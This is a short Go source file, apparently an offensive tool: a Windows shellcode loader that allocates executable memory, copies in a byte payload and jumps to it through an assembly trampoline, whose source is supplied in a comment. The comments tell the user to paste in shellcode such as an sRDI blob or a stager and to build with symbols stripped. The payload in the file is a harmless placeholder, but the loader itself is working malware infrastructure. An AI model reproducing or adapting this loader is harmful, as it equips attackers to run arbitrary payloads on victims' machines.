//go:build windows

// Minimal Go x64 Windows loader. Build with:
//   GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" loader.go
package main

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

// Paste the raw shellcode bytes here (sRDI blob or stager).
var payload = []byte{0x90, 0x90, 0xcc}

// trampoline_amd64.s provides the jump.
func execCode(addr uintptr)

func main() {
	addr, err := windows.VirtualAlloc(0, uintptr(len(payload)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 || err != nil {
		return
	}
	var written uintptr
	_ = windows.WriteProcessMemory(windows.GetCurrentProcess(), addr, &payload[0], uintptr(len(payload)), &written)
	execCode(addr)
}

// Copy the following to trampoline_amd64.s in the same directory:
//
//	#include "textflag.h"
//	TEXT ·execCode(SB), NOSPLIT, $0-8
//		MOVQ addr+0(FP), AX
//		MOVQ SP, BX
//		ANDQ $~15, SP
//		CALL AX
//		MOVQ BX, SP
//		RET
//
// The pointer-arithmetic import keeps unsafe reachable for older toolchains.
var _ = unsafe.Pointer
